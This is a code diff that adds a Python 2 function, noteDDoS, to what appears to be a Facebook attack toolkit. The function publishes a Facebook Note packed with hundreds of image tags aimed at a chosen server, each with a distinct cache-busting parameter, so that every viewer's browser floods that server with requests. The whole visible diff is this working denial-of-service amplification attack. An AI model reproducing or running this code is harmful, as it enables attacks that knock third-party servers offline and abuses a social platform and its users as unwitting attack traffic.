@@ -2132,3 +2132,43 @@ def simpleDotGraph(friends, victim):
 
     myGraph.write('}')    
     myGraph.close()
+    
+def noteDDoS(imageURL,noteID, privacy):
+    set_dtsg()   
+    j = int(raw_input('starting parameter number? (img.jpg?file=number) : '))
+    amount = int(raw_input('last parameter number? (img.jpg?file=number) : '))
+    title = raw_input('Note title: ')
+    content = '<p>' + raw_input('Note preview text: ') + '</p>' 
+    for i in range(j,int(amount)):
+        content += '<p><img src="'+imageURL+'?file='+str(i)+'"></img></p>'
+        
+    arguments = {
+        'fb_dtsg' : br.form['fb_dtsg'],
+        'object_id' : noteID,
+        'note_id' : noteID,
+        'id' : getC_user(),
+        'title' : title,
+        'note_content' : content,
+        'audience['+noteID+'][value]' : privacy,
+        'publish' : 'Publish',
+        '__user' : getC_user(),
+        '__a' : '1',
+        '__dyn' : '7n8ahyj34fzpQ9UoHaEWy1m9ACwKyaF3pqzCAjFDxCm6qyE',
+        '__req' : '7',
+        'ttstamp' : '2658169897154120115496511690',
+        '__rev' : '1224624'
+        }
+    
+    datos = urlencode(arguments)
+    try:
+        response = br.open('https://www.facebook.com/ajax/notes/edit',datos)
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in the DDoS module')
+        print '\rError in the DDoS module\r'
+        raise 
